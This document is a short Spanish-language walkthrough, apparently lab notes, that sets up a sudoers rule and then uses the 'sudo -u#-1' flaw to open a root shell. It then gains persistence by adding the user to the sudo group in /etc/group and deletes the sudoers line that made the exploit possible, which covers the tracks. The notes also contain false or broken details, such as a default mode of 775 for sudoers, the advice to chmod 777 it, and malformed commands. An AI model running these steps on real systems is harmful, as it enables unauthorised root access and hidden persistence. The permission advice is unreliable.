#0.- Por defecto /etc/sudoers tiene permisos chmod 775. 

Intentamos para editar sin problemas el fichero sudoers $chmod 777 /etc/sudoers  y volvemos a restablecer después los privilegios chmod 755 /etc/sudoers

#1.- Editamos el fichero /etc/sudoers con 

$usermod -aG sudo antonio

$sudo visudo 

#2.- Añadimos la linea con el usuario antonio 

#User privilege specification

root ALL=(ALL:ALL) ALL

antonio ALL=(ALL) /usr/bin/id

#4.- Ejecutamos: 

$su antonio

$sudo id

$sudo whoani

$sudo -u antonio id

#5.- Volvemos a editar el fichero /etc/sudoers con $sudo visudo

#6.- Modificamos la línea

antonio ALL=(ALL, !root) ALL

#7.- Explotamos la vulnerabilidad con sudo -u#-1

$chmod 755 /etc/sudoers

$sudo -u#-1 /bin/bash

#whoami

root

#8.- ya somos root!

exit

#9.- Otro si: añadimos en la línea sudo de /etc/group a antonio y nos hacernos persistentes en la maquina:

sudo vim /etc/group

sudo : x:27:antonio

forzamos la escritura en group al salir con :wq!

$sudo antonio

$sudo su

#10.- ya somos del grupo sudo y podemos elevar a root!

Editamos y eliminamos de sudoers la linea
antonio ALL=(ALL, !root) ALL

